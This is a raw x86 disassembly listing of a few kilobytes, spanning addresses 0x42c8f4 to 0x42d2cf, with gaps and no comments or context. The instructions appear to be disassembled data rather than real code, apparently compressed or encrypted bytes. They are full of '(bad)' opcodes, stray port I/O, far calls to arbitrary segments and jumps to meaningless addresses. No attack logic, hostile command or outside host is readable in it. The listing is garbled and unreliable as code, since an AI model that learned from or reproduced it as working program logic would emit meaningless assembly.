  42c8f4:	mov    ah,0x17
  42c8f6:	call   0x7396:0x93f5276c
  42c8fd:	retf   
  42c8fe:	jnp    0x42c88d
  42c900:	out    0xb1,al
  42c902:	mov    ah,0x8c
  42c904:	dec    ebx
  42c905:	or     eax,0xf0b8bcd4
  42c90a:	or     dh,0x6b
  42c90d:	jae    0x42c8ef
  42c90f:	pop    esp
	...
  42c974:	adc    BYTE PTR [ebx],bl
  42c976:	leave  
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x85d8b5f0
  42c984:	clc    
  42c985:	fadd   QWORD PTR [ecx]
  42c987:	add    BYTE PTR [ecx+eax*1],al
  42c98a:	add    BYTE PTR [eax],al
  42c98c:	cmp    al,0x8a
  42c98e:	jb     0x42c944
  42c990:	dec    esi
  42c991:	in     eax,dx
  42c992:	ja     0x42c9f2
  42c994:	jne    0x42c9aa
  42c996:	and    edx,DWORD PTR [ecx]
  42c998:	test   al,0x6c
  42c99a:	fs jmp 0x61b7:0x738c686c
  42c9a2:	mov    esp,0x23f3108e
  42c9a7:	aas    
  42c9a8:	out    0xa,al
  42c9aa:	sub    dh,BYTE PTR [edi+0x2d1c8e3a]
  42c9b0:	out    dx,eax
  42c9b1:	(bad)  
  42c9b2:	ss xchg ebp,eax
  42c9b4:	pop    ss
  42c9b5:	lods   al,BYTE PTR ds:[esi]
  42c9b6:	inc    esi
  42c9b7:	jecxz  0x42c9f4
  42c9b9:	mov    edi,DWORD PTR [edi-0x63e0e9f4]
  42c9bf:	iret   
  42c9c0:	add    BYTE PTR [esi],ah
  42c9c2:	popa   
  42c9c3:	pushf  
  42c9c4:	mov    ecx,0x299ee652
  42c9c9:	jbe    0x42c99b
  42c9cb:	push   cs
  42c9cc:	test   ecx,ecx
  42c9ce:	push   edi
  42c9cf:	lods   al,BYTE PTR ds:[esi]
  42c9d0:	mov    DWORD PTR [esi-0x4d62f94b],edx
  42c9d6:	mov    dh,0x31
  42c9d8:	out    dx,eax
  42c9d9:	fsub   QWORD PTR [edi-0x919f979]
  42c9df:	(bad)  
  42c9e0:	pop    edx
  42c9e1:	loop   0x42c9f6
  42c9e3:	retf   
  42c9e4:	arpl   WORD PTR [edi+esi*8+0x6197f16e],si
  42c9eb:	call   0xd059cb3d
  42c9f0:	aas    
  42c9f1:	arpl   WORD PTR [ebx+ebp*2+0x14c525a5],ax
  42c9f8:	sbb    ecx,eax
  42c9fa:	add    eax,DWORD PTR [ecx+0x6d]
  42c9fd:	ror    DWORD PTR [edx-0x52],1
  42ca00:	arpl   WORD PTR [edi],cx
  42ca02:	push   ss
  42ca03:	xchg   DWORD PTR [edi+0x72cbe8da],esp
  42ca09:	in     eax,0x7d
  42ca0b:	xchg   BYTE PTR [ebp+edx*1-0x7],dh
  42ca0f:	scas   eax,DWORD PTR es:[edi]
  42ca10:	enter  0x3de5,0x0
  42ca14:	mov    bl,0x8b
  42ca16:	fisttp DWORD PTR [esi]
  42ca18:	push   0x1b
  42ca1a:	imul   BYTE PTR [ebx-0x63]
  42ca1d:	inc    ebp
  42ca1e:	cmc    
  42ca1f:	aam    0x28
  42ca21:	nop
  42ca22:	imul   ebp,DWORD PTR [ebp-0x55],0xffffffcc
  42ca26:	xchg   edi,eax
  42ca27:	fwait
  42ca28:	pop    es
  42ca29:	pop    ebp
  42ca2a:	sar    BYTE PTR ds:0x2930d7fc,cl
  42ca30:	cmp    DWORD PTR [esi+0x4cb735b1],esi
  42ca36:	jnp    0x42c9c2
  42ca38:	or     dl,al
  42ca3a:	lods   eax,DWORD PTR ds:[esi]
  42ca3b:	pushf  
  42ca3c:	adc    ebx,DWORD PTR [ebp+0x74]
  42ca3f:	sar    DWORD PTR [esi+0x7e],1
  42ca42:	pop    edx
  42ca43:	call   0x3da8:0xe7edc79d
  42ca4a:	jg     0x42c9d3
  42ca4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ca4d:	(bad)  
  42ca4e:	mov    WORD PTR [edx],gs
  42ca50:	lock ds mov cl,0x17
  42ca54:	jl     0x42cab4
  42ca56:	mov    eax,0xa322b449
  42ca5b:	daa    
  42ca5c:	arpl   bp,si
  42ca5e:	push   ss
  42ca5f:	addr16 jg 0x42ca08
  42ca62:	and    bh,BYTE PTR [ebx]
  42ca64:	sahf   
  42ca65:	mov    bl,0xa3
  42ca67:	or     dl,BYTE PTR [ecx-0x57a105a7]
  42ca6d:	inc    eax
  42ca6e:	sbb    BYTE PTR [edx],bl
  42ca70:	jno    0x42ca59
  42ca72:	in     al,0x25
  42ca74:	inc    ebp
  42ca75:	push   0x99cb4661
  42ca7a:	jno    0x42ca8c
  42ca7c:	aas    
  42ca7d:	sub    al,0x70
  42ca7f:	xchg   ecx,eax
  42ca80:	cmp    edi,DWORD PTR [ebp-0x42fb5b23]
  42ca86:	xchg   edx,eax
  42ca87:	mov    BYTE PTR [ebp+0x25],dl
  42ca8a:	outs   dx,DWORD PTR ds:[esi]
  42ca8b:	and    al,0x90
  42ca8d:	cld    
  42ca8e:	ins    BYTE PTR es:[edi],dx
  42ca8f:	sldt   WORD PTR [eax]
	...
  42caf2:	add    BYTE PTR [eax],al
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x1ac66ec0]
  42cb02:	or     DWORD PTR [ebx],ebp
  42cb04:	cld    
  42cb05:	fld    QWORD PTR [ecx]
  42cb07:	add    BYTE PTR [ecx+eax*1],al
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	add    eax,0xa4573a29
  42cb11:	daa    
  42cb12:	or     al,0x1d
  42cb14:	and    dh,BYTE PTR [eax-0x48]
  42cb17:	pop    ebx
  42cb18:	sub    esi,DWORD PTR [ecx+0x4b]
  42cb1b:	or     ecx,DWORD PTR cs:[edx-0x4148a6c9]
  42cb22:	cmovae esi,DWORD PTR [ebp+ebp*1-0x63707952]
  42cb2a:	push   ss
  42cb2b:	inc    esp
  42cb2c:	xchg   bl,ch
  42cb2e:	jle    0x42cadd
  42cb30:	jecxz  0x42cbaf
  42cb32:	jp     0x42cad4
  42cb34:	mov    ds:0x2c5efa68,al
  42cb39:	paddusb mm7,mm1
  42cb3c:	ds lahf 
  42cb3e:	data16 xor al,BYTE PTR ds:0xbbab01ab
  42cb45:	pop    ds
  42cb46:	(bad)  
  42cb47:	cmp    esi,DWORD PTR [ebx]
  42cb49:	mov    ebx,0xd2d744a
  42cb4e:	sahf   
  42cb4f:	ja     0x42cb4b
  42cb51:	das    
  42cb52:	push   ebx
  42cb53:	jg     0x42cb2c
  42cb55:	cmp    ebx,DWORD PTR [esi+0x693621f7]
  42cb5b:	or     al,BYTE PTR [edx+0x6dcfc388]
  42cb61:	pop    ebp
  42cb62:	xchg   edx,eax
  42cb63:	add    al,0x20
  42cb65:	xor    ch,cl
  42cb67:	mov    ebx,0x800c95ee
  42cb6c:	sahf   
  42cb6d:	fs mov ah,0x79
  42cb70:	dec    ecx
  42cb71:	dec    edx
  42cb72:	je     0x42caf6
  42cb74:	mov    dh,0xeb
  42cb76:	lds    ebx,FWORD PTR [ecx]
  42cb78:	mov    bl,0xb9
  42cb7a:	cli    
  42cb7b:	xchg   esi,eax
  42cb7c:	aam    0xd
  42cb7e:	mov    edx,0xb7d0e7b1
  42cb83:	test   DWORD PTR [esi],ebp
  42cb85:	out    dx,al
  42cb86:	imul   ecx,DWORD PTR [edi+0x32bc196c],0x8dc4e04c
  42cb90:	push   esp
  42cb91:	push   esp
  42cb92:	rcr    BYTE PTR [edx],1
  42cb94:	inc    ebp
  42cb95:	pusha  
  42cb96:	loope  0x42cc0d
  42cb98:	pop    eax
  42cb99:	imul   ecx,edx,0xffffff84
  42cb9c:	mov    ebp,0x74e11161
  42cba1:	push   0xffffff92
  42cba3:	pop    ecx
  42cba4:	into   
  42cba5:	cdq    
  42cba6:	mov    DWORD PTR [eax-0x4e],esp
  42cba9:	inc    eax
  42cbaa:	test   ebx,esi
  42cbac:	add    DWORD PTR [esi-0x366fd84c],edx
  42cbb2:	dec    ebx
  42cbb3:	push   ds
  42cbb4:	mov    eax,eax
  42cbb6:	inc    ebx
  42cbb7:	inc    edx
  42cbb8:	xchg   ebx,eax
  42cbb9:	lahf   
  42cbba:	dec    ecx
  42cbbb:	cmp    al,0xf
  42cbbd:	push   es
  42cbbe:	lahf   
  42cbbf:	xchg   sp,ax
  42cbc1:	scas   eax,DWORD PTR es:[edi]
  42cbc2:	and    DWORD PTR [ebx-0x4418d851],ebp
  42cbc8:	push   ecx
  42cbc9:	lea    ebx,[ebx+0x6e]
  42cbcc:	xor    BYTE PTR [edi+0x401890b7],ch
  42cbd2:	stos   BYTE PTR es:[edi],al
  42cbd3:	ss mov esi,0x8b1b06
  42cbd9:	imul   ecx,ecx,0xfffffff0
  42cbdc:	sub    ebx,DWORD PTR [ebp+0x29f5b681]
  42cbe2:	push   ecx
  42cbe3:	(bad)
  42cbe6:	lahf   
  42cbe7:	jo     0x42cc06
  42cbe9:	push   edx
  42cbea:	add    bh,dl
  42cbec:	mov    ah,0x61
  42cbee:	mov    ebx,ecx
  42cbf0:	loope  0x42cc04
  42cbf2:	cmc    
  42cbf3:	sub    esp,DWORD PTR [ebx+0x24d03fca]
  42cbf9:	or     eax,0x40997ad6
  42cbfe:	cmp    al,0x35
  42cc00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cc01:	fisttp WORD PTR ds:0x652fdc1f
  42cc07:	xor    eax,0xe4942595
  42cc0c:	fdiv   DWORD PTR [ebx+eiz*4]
  42cc0f:	pushf  
	...
  42cc74:	jg     0x42cc78
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x11aff9de
  42cc84:	add    bh,bl
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    al,0x1
  42cc8a:	add    BYTE PTR [eax],al
  42cc8c:	inc    edi
  42cc8d:	or     ch,BYTE PTR es:[edi]
  42cc90:	dec    edx
  42cc91:	push   ecx
  42cc92:	test   DWORD PTR [ebx+0x42add808],eax
  42cc98:	mov    dh,0xf
  42cc9a:	pop    es
  42cc9b:	es ins BYTE PTR es:[edi],dx
  42cc9d:	cmp    ebp,DWORD PTR [edi+0x52]
  42cca0:	iret   
  42cca1:	or     eax,0xab6bf16d
  42cca6:	jge    0x42cd00
  42cca8:	pop    ecx
  42cca9:	pop    ebx
  42ccaa:	cli    
  42ccab:	outs   dx,BYTE PTR ds:[esi]
  42ccac:	sub    al,0x21
  42ccae:	es add eax,eax
  42ccb1:	inc    ecx
  42ccb3:	jnp    0x42cc51
  42ccb5:	lods   eax,DWORD PTR ds:[esi]
  42ccb6:	(bad)  
  42ccb7:	fsub   st,st(2)
  42ccb9:	les    edi,FWORD PTR [edi+0x795c3af4]
  42ccbf:	sbb    eax,DWORD PTR ds:[eax-0x6a91a71b]
  42ccc6:	sub    cl,dl
  42ccc8:	dec    edi
  42ccc9:	lods   al,BYTE PTR ds:[esi]
  42ccca:	add    BYTE PTR [edi+0x360fd087],ch
  42ccd0:	adc    DWORD PTR [ebp-0x45],esi
  42ccd3:	mov    gs,WORD PTR [eax+0x3feda93a]
  42ccd9:	jne    0x42cd1f
  42ccdb:	pop    ds
  42ccdc:	add    bh,BYTE PTR [edi-0x79b3dd9]
  42cce2:	inc    edx
  42cce3:	dec    ebp
  42cce4:	jg     0x42cd2c
  42cce6:	mov    cl,0x67
  42cce8:	in     al,0xe4
  42ccea:	lahf   
  42cceb:	loopne 0x42cc93
  42cced:	xor    edi,esp
  42ccef:	rol    ebx,cl
  42ccf1:	jge    0x42cca9
  42ccf3:	mov    al,0x84
  42ccf5:	inc    edx
  42ccf6:	sbb    ebx,DWORD PTR [eax+eiz*1-0x55]
  42ccfa:	bound  edx,QWORD PTR [edx+eax*8-0x49f4edda]
  42cd01:	fs leave 
  42cd03:	fsub   st,st(3)
  42cd05:	sbb    esi,DWORD PTR [esi+0x6d653047]
  42cd0b:	jp     0x42ccd6
  42cd0d:	dec    esi
  42cd0e:	add    al,0x9c
  42cd10:	jmp    0x3785d591
  42cd15:	daa    
  42cd16:	xor    eax,0x7a622fdf
  42cd1b:	mov    al,0x1f
  42cd1d:	aam    0x82
  42cd1f:	scas   al,BYTE PTR es:[edi]
  42cd20:	std    
  42cd21:	bswap  ebp
  42cd23:	retf   
  42cd24:	push   ss
  42cd25:	ret    0x9ec
  42cd28:	adc    BYTE PTR [edi+0x60],cl
  42cd2b:	cmp    al,0xa
  42cd2d:	ds pop ecx
  42cd2f:	sub    DWORD PTR ds:0x56da4d6f,eax
  42cd35:	cmp    DWORD PTR [esi+0x40],esp
  42cd38:	mov    bl,0xbc
  42cd3a:	jmp    0x1f07:0xef8ab30f
  42cd41:	or     eax,0x7a0c31e4
  42cd46:	dec    esp
  42cd47:	xor    bh,BYTE PTR [eax-0x6f9898e7]
  42cd4d:	push   eax
  42cd4e:	ins    BYTE PTR es:[edi],dx
  42cd4f:	jae    0x42cd42
  42cd51:	jle    0x42cd16
  42cd53:	mov    eax,0x318941ea
  42cd58:	ffree  st(6)
  42cd5a:	hlt    
  42cd5b:	push   esp
  42cd5c:	retf   
  42cd5d:	outs   dx,BYTE PTR ds:[esi]
  42cd5e:	stos   DWORD PTR es:[edi],eax
  42cd5f:	iret   
  42cd60:	in     eax,dx
  42cd61:	je     0x42ccee
  42cd63:	pop    ecx
  42cd64:	scas   eax,DWORD PTR es:[edi]
  42cd65:	loop   0x42cdac
  42cd67:	mov    al,0x8a
  42cd69:	sub    eax,0xe68be1ec
  42cd6e:	nop
  42cd6f:	stc    
  42cd70:	cld    
  42cd71:	das    
  42cd72:	scas   eax,DWORD PTR es:[edi]
  42cd73:	xchg   BYTE PTR [ebp+0xb],cl
  42cd76:	pop    edi
  42cd77:	pop    eax
  42cd78:	(bad)  
  42cd79:	mov    al,ds:0x90c833d2
  42cd7e:	out    0xfa,al
  42cd80:	pop    edx
  42cd81:	inc    ebx
  42cd82:	pusha  
  42cd83:	loop   0x42cd34
  42cd85:	mov    al,0x8c
  42cd87:	mov    al,0xac
  42cd89:	adc    al,0xa2
  42cd8b:	test   eax,0xa7ff0880
	...
  42cdf4:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0xed
  42ce01:	xor    al,0x3c
  42ce03:	cmp    eax,DWORD PTR [eax+eiz*8]
  42ce06:	add    DWORD PTR [eax],eax
  42ce08:	add    al,0x1
  42ce0a:	add    BYTE PTR [eax],al
  42ce0c:	mov    bl,0xa8
  42ce0e:	mov    eax,DWORD PTR ds:[ebp-0x15]
  42ce12:	mov    esi,0xf72e6bd0
  42ce17:	xchg   BYTE PTR [edx],cl
  42ce19:	mov    bl,0x2d
  42ce1b:	es add al,0x2c
  42ce1e:	outs   dx,BYTE PTR ds:[esi]
  42ce1f:	div    BYTE PTR [esi]
  42ce21:	inc    BYTE PTR [esi-0x3c]
  42ce24:	jae    0x42ce7e
  42ce26:	lods   eax,DWORD PTR ds:[esi]
  42ce27:	jmp    0x237bdad0
  42ce2c:	inc    ebp
  42ce2d:	out    dx,eax
  42ce2e:	les    ebx,FWORD PTR [edx+0x2]
  42ce31:	shl    DWORD PTR [edi],0xc2
  42ce34:	call   0x12e9:0x305e4214
  42ce3b:	jae    0x42ce44
  42ce3d:	ror    BYTE PTR [esi],cl
  42ce3f:	mov    ecx,0xf4bf5631
  42ce44:	push   ebx
  42ce45:	div    bl
  42ce47:	mov    eax,eax
  42ce49:	leave  
  42ce4a:	sub    ecx,DWORD PTR [edi+ebx*1]
  42ce4d:	xchg   esp,eax
  42ce4e:	imul   esp,ebx,0x2939ec61
  42ce54:	iret   
  42ce55:	xor    ebx,DWORD PTR cs:[esi]
  42ce58:	imul   eax,DWORD PTR [edi-0x50],0x2267f997
  42ce5f:	cmp    al,0x88
  42ce61:	dec    ebx
  42ce62:	fsubr  DWORD PTR [eax]
  42ce64:	xchg   edi,eax
  42ce65:	mov    bh,0xda
  42ce67:	inc    ebx
  42ce68:	ror    BYTE PTR [edi],1
  42ce6a:	or     DWORD PTR [esi+0x5a],0xffffffc4
  42ce6e:	pop    ebx
  42ce6f:	or     DWORD PTR ds:0xc105b092,eax
  42ce75:	es inc eax
  42ce77:	cwde   
  42ce78:	data16 int3 
  42ce7a:	icebp  
  42ce7b:	fdivr  QWORD PTR [edi]
  42ce7d:	push   edi
  42ce7e:	push   ebx
  42ce7f:	push   edx
  42ce80:	add    bl,BYTE PTR [ecx+eax*8-0x18114b00]
  42ce87:	aaa    
  42ce88:	aad    0xd5
  42ce8a:	mov    dl,ah
  42ce8c:	dec    eax
  42ce8d:	dec    esp
  42ce8e:	lods   al,BYTE PTR ds:[esi]
  42ce8f:	pop    ebx
  42ce90:	popa   
  42ce91:	inc    esp
  42ce92:	call   0x4f3bc21b
  42ce97:	icebp  
  42ce98:	mov    cl,0x6f
  42ce9a:	pop    ebx
  42ce9b:	cld    
  42ce9c:	pop    ss
  42ce9d:	stos   BYTE PTR es:[edi],al
  42ce9e:	jg     0x42ceb4
  42cea0:	(bad)  
  42cea1:	out    0x8e,al
  42cea3:	cmp    BYTE PTR [ebx+edx*1-0x7f],bh
  42cea7:	lahf   
  42cea8:	aad    0xc
  42ceaa:	push   0xffffffd7
  42ceac:	les    ebp,FWORD PTR [eax]
  42ceae:	pop    eax
  42ceb0:	in     al,0x30
  42ceb2:	fwait
  42ceb3:	daa    
  42ceb4:	jb     0x42cea5
  42ceb6:	pop    ebx
  42ceb7:	stos   DWORD PTR es:[edi],eax
  42ceb8:	sbb    BYTE PTR [si-0x46],cl
  42cebc:	stos   DWORD PTR es:[edi],eax
  42cebd:	cmc    
  42cebe:	mov    edi,0x9c7b9069
  42cec3:	(bad)  
  42cec4:	push   ebx
  42cec5:	add    DWORD PTR [eax],0x4f
  42cec8:	test   BYTE PTR [esi],ah
  42ceca:	xor    ch,BYTE PTR [edx-0x7f08e46d]
  42ced0:	xchg   DWORD PTR [eax+ebp*1-0x4e],ecx
  42ced4:	dec    ebx
  42ced5:	mov    ebx,0x6f1d5e
  42ceda:	mov    edx,0xe84f0909
  42cedf:	dec    edi
  42cee0:	daa    
  42cee1:	(bad)  
  42cee2:	push   ss
  42cee3:	shl    DWORD PTR [edx],0x9f
  42cee6:	test   eax,0xa270de77
  42ceeb:	daa    
  42ceec:	or     BYTE PTR [ebx-0x11e29ce9],bh
  42cef2:	in     eax,dx
  42cef3:	dec    ebp
  42cef4:	mov    BYTE PTR [ebp+eiz*8+0x11bf6466],dl
  42cefb:	(bad)  
  42cefc:	cli    
  42cefd:	cwde   
  42cefe:	or     BYTE PTR [ecx-0x11],0x43
  42cf02:	repz push esp
  42cf04:	mov    ds:0x1fd483b4,al
  42cf09:	(bad)  
  42cf0a:	cld    
  42cf0b:	inc    esi
  42cf0c:	call   0x0:0x5059c0
	...
  42cf73:	add    BYTE PTR [ebx+0x3d],dh
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    ebx,FWORD PTR ds:0x8f912d1
  42cf85:	loope  0x42cf88
  42cf87:	add    BYTE PTR [ecx+eax*1],al
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	xchg   ebp,eax
  42cf8d:	adc    al,0x1d
  42cf8f:	in     al,dx
  42cf90:	bound  ebp,QWORD PTR [ebp-0x44]
  42cf93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf94:	add    al,bh
  42cf96:	inc    ebx
  42cf97:	js     0x42cfcf
  42cf99:	mov    esp,0x7452f597
  42cf9e:	inc    eax
  42cf9f:	lods   al,BYTE PTR ds:[esi]
  42cfa0:	push   ds
  42cfa1:	jae    0x42cfa7
  42cfa3:	enter  0x3de,0x21
  42cfa7:	cmp    dh,BYTE PTR [eax-0x66]
  42cfaa:	mov    BYTE PTR [ecx-0x73baac7e],dh
  42cfb0:	imul   ebx,ecx,0xd138d4ce
  42cfb6:	mov    ds:0x126fc38e,al
  42cfbb:	push   0xd0b0e9fe
  42cfc0:	xchg   esp,eax
  42cfc1:	bound  ecx,QWORD PTR ds:0xc22258bb
  42cfc7:	je     0x42cfd7
  42cfc9:	sbb    esi,ebp
  42cfcb:	inc    edi
  42cfcc:	pop    ss
  42cfcd:	push   0x68
  42cfcf:	sahf   
  42cfd0:	out    dx,al
  42cfd1:	nop
  42cfd2:	add    eax,0xf0e86991
  42cfd7:	enter  0x41a4,0x5d
  42cfdb:	(bad)  
  42cfdc:	sbb    al,0xe4
  42cfde:	adc    al,0x89
  42cfe0:	jg     0x42cfb1
  42cfe2:	(bad)  
  42cfe3:	mov    al,ds:0x6b5787d3
  42cfe8:	add    al,0x4a
  42cfea:	scas   eax,DWORD PTR es:[edi]
  42cfeb:	push   ss
  42cfec:	mov    al,0xfc
  42cfee:	stc    
  42cfef:	stos   BYTE PTR es:[edi],al
  42cff0:	fcom   DWORD PTR [edx+ebp*2-0x3d267e36]
  42cff7:	repz and WORD PTR [edi],bx
  42cffb:	sbb    al,0xc2
  42cffd:	xor    eax,DWORD PTR [ebx-0x1589cf45]
  42d003:	fdiv   DWORD PTR ds:0xd3581b76
  42d009:	test   BYTE PTR [eax-0x5b],ah
  42d00c:	fnstcw WORD PTR [eax-0x1c6977c5]
  42d012:	fild   DWORD PTR [ebx+esi*4-0x6e]
  42d016:	inc    ebx
  42d017:	xchg   ebx,eax
  42d018:	xor    BYTE PTR ds:0x27934520,0xa7
  42d01f:	add    al,0xb3
  42d021:	neg    BYTE PTR [edx+ebp*8]
  42d024:	lods   eax,DWORD PTR ds:[esi]
  42d025:	fadd   DWORD PTR [ecx]
  42d027:	in     eax,dx
  42d028:	loope  0x42d07b
  42d02a:	dec    BYTE PTR [eax-0x2b6fd3ea]
  42d030:	mov    ds:0xf11b7765,al
  42d035:	pop    edx
  42d036:	mov    ds:0xfb0ca793,al
  42d03b:	xchg   ebx,eax
  42d03c:	mov    bl,0x69
  42d03e:	push   ebx
  42d03f:	out    dx,al
  42d040:	(bad)  
  42d041:	jb     0x42d08f
  42d043:	or     eax,0x5f3932c4
  42d048:	inc    ebx
  42d049:	inc    edi
  42d04a:	or     al,cl
  42d04c:	gs in  eax,dx
  42d04e:	jl     0x42d04e
  42d050:	jo     0x42cfd2
  42d052:	out    dx,al
  42d053:	pusha  
  42d054:	mov    ah,0xe7
  42d056:	in     eax,dx
  42d057:	mov    WORD PTR [edi-0x7089ef3a],?
  42d05d:	mov    al,0x24
  42d05f:	scas   eax,DWORD PTR es:[edi]
  42d060:	push   esp
  42d061:	(bad)  
  42d062:	xor    esi,edi
  42d064:	cmp    BYTE PTR ds:0x2d6ad82f,bl
  42d06a:	gs ins BYTE PTR es:[edi],dx
  42d06c:	sbb    edi,esi
  42d06e:	or     dl,BYTE PTR [ecx]
  42d070:	pop    es
  42d071:	loope  0x42d07d
  42d073:	in     eax,dx
  42d074:	mov    al,0x62
  42d076:	lods   al,BYTE PTR ds:[esi]
  42d077:	mov    al,0x84
  42d079:	jbe    0x42d02b
  42d07b:	ret    
  42d07c:	out    dx,eax
  42d07d:	push   esp
  42d07e:	cld    
  42d07f:	loope  0x42d031
  42d081:	dec    ecx
  42d082:	test   BYTE PTR [ecx+0x76],ch
  42d085:	jmp    0x42d058
  42d087:	xchg   ebx,eax
  42d088:	(bad)  
  42d089:	jb     0x42d093
  42d08b:	xor    al,0x44
  42d08d:	pop    ss
  42d08e:	sub    al,0x5d
	...
  42d0f4:	push   eax
  42d0f5:	cmp    al,dh
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    BYTE PTR [edx*8-0x1df363aa],ah
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    al,0x1
  42d10a:	add    BYTE PTR [eax],al
  42d10c:	(bad)  
  42d10d:	sbb    cl,BYTE PTR [edx+0x30]
  42d110:	inc    eax
  42d111:	fs push 0xb691b69f
  42d117:	(bad)
  42d11b:	fst    DWORD PTR [ebp-0xdf66c8f]
  42d121:	add    BYTE PTR ds:0x427e7cd8,al
  42d127:	or     edx,edx
  42d129:	push   ebx
  42d12a:	(bad)  
  42d12b:	popa   
  42d12c:	and    bl,BYTE PTR [eax+0x6a]
  42d12f:	sbb    ecx,ebx
  42d131:	xchg   edi,eax
  42d132:	in     al,0x6f
  42d134:	(bad)  
  42d135:	dec    esi
  42d136:	inc    edx
  42d137:	das    
  42d138:	sahf   
  42d139:	jecxz  0x42d0f0
  42d13b:	add    DWORD PTR [eax],esp
  42d13d:	jecxz  0x42d13b
  42d13f:	ja     0x42d19b
  42d141:	xlat   BYTE PTR ds:[ebx]
  42d142:	in     eax,dx
  42d143:	mov    edx,0x171c8453
  42d148:	add    eax,0xbb3ddc0e
  42d14d:	fst    DWORD PTR [ecx]
  42d14f:	out    dx,eax
  42d150:	jmp    0x77a88a54
  42d155:	es pop edx
  42d157:	jno    0x42d184
  42d159:	call   0xe6b:0x1041891b
  42d160:	pop    ebx
  42d162:	loop   0x42d134
  42d164:	ins    DWORD PTR es:[edi],dx
  42d165:	and    esp,DWORD PTR es:[ebx]
  42d168:	xor    DWORD PTR [ebp-0x22d7b723],edi
  42d16e:	ins    BYTE PTR es:[edi],dx
  42d16f:	pop    ecx
  42d170:	test   BYTE PTR [ebp-0x41a4aeb2],al
  42d176:	rol    DWORD PTR ds:0x82ea84a4,1
  42d17c:	in     eax,dx
  42d17d:	mov    WORD PTR [edx+0x19],es
  42d180:	dec    esp
  42d181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d182:	xchg   esp,eax
  42d183:	mov    al,0x9d
  42d185:	push   ds
  42d186:	in     al,0x13
  42d188:	xlat   BYTE PTR ds:[ebx]
  42d189:	push   esi
  42d18a:	xor    ecx,DWORD PTR [esi]
  42d18c:	and    eax,0x3f765f1b
  42d191:	ds popa 
  42d193:	scas   al,BYTE PTR es:[edi]
  42d194:	jmp    0xc3e92a60
  42d199:	fld    QWORD PTR [esi+0x73]
  42d19c:	mov    ecx,0x63418a8c
  42d1a1:	mov    WORD PTR [ebx-0x4d],es
  42d1a4:	test   bl,0xdb
  42d1a7:	dec    edi
  42d1a8:	adc    BYTE PTR [ecx-0x5b91ce19],ah
  42d1ae:	pop    eax
  42d1af:	imul   eax,esp,0xab27611a
  42d1b5:	sub    BYTE PTR [esi-0x1f],dh
  42d1b8:	add    al,0x14
  42d1ba:	xchg   BYTE PTR ds:[edi-0x37],cl
  42d1be:	test   eax,0x95b6fe8e
  42d1c3:	scas   eax,DWORD PTR es:[edi]
  42d1c4:	je     0x42d1a2
  42d1c6:	retf   
  42d1c7:	cmp    eax,DWORD PTR [edx-0x80]
  42d1ca:	sbb    DWORD PTR [eax-0x49],esi
  42d1cd:	jb     0x42d193
  42d1cf:	cs hlt 
  42d1d1:	cmc    
  42d1d2:	jmp    0xcb184792
  42d1d7:	xor    ebp,esi
  42d1d9:	xor    DWORD PTR [ebp+0x2e],edi
  42d1dc:	shl    BYTE PTR [edx],0x93
  42d1df:	test   al,al
  42d1e1:	cmp    DWORD PTR [ebp+0x65],esi
  42d1e4:	out    0xca,eax
  42d1e6:	mov    edx,0xb9f2fec6
  42d1eb:	jmp    0x1bced19f
  42d1f0:	sti    
  42d1f1:	ret    0xeeb2
  42d1f4:	fist   WORD PTR [ebx-0x62]
  42d1f7:	test   al,0x50
  42d1f9:	inc    ebx
  42d1fa:	jno    0x42d1d4
  42d1fc:	mov    ds:0x8c77a777,al
  42d201:	aas    
  42d202:	les    ebx,FWORD PTR [eax+0xd]
  42d205:	sub    ebp,ebp
  42d207:	dec    ebx
  42d208:	adc    DWORD PTR [edx],edx
  42d20a:	pop    esi
  42d20b:	(bad)  
  42d20c:	dec    esi
  42d20d:	xor    al,BYTE PTR [ebx]
  42d20f:	cmc    
	...
  42d274:	lea    ecx,[eax]
  42d276:	pop    ebp
  42d277:	jbe    0x42d256
  42d279:	ja     0x42d22a
  42d27b:	sti    
  42d27c:	aaa    
  42d27d:	out    0x36,eax
  42d27f:	ja     0x42d2aa
  42d281:	retf   
  42d282:	sar    DWORD PTR ds:0x1e310,cl
  42d288:	add    al,0x1
  42d28a:	add    BYTE PTR [eax],al
  42d28c:	js     0x42d28f
  42d28e:	and    cl,BYTE PTR [eax]
  42d290:	int    0x5d
  42d292:	sbb    al,0x37
  42d294:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d295:	in     al,dx
  42d296:	push   edi
  42d297:	lock mov bh,0xcf
  42d29a:	and    DWORD PTR [esi-0x24],eax
  42d29d:	dec    esi
  42d29e:	inc    edx
  42d29f:	imul   esp,DWORD PTR [eax-0x14fb516d],0x10
  42d2a6:	imul   esi,edx,0x8c87f4e
  42d2ac:	in     al,dx
  42d2ad:	test   al,0x5a
  42d2af:	sbb    DWORD PTR [ebx-0x6e57c6a2],0x496be7e
  42d2b9:	mov    al,ds:0xf693da3a
  42d2be:	mov    esp,0xe2a78594
  42d2c3:	xor    DWORD PTR [edi-0x509cab4f],0x3d414695
  42d2cd:	mov    cl,0x36
  42d2cf:	xchg   ecx,eax
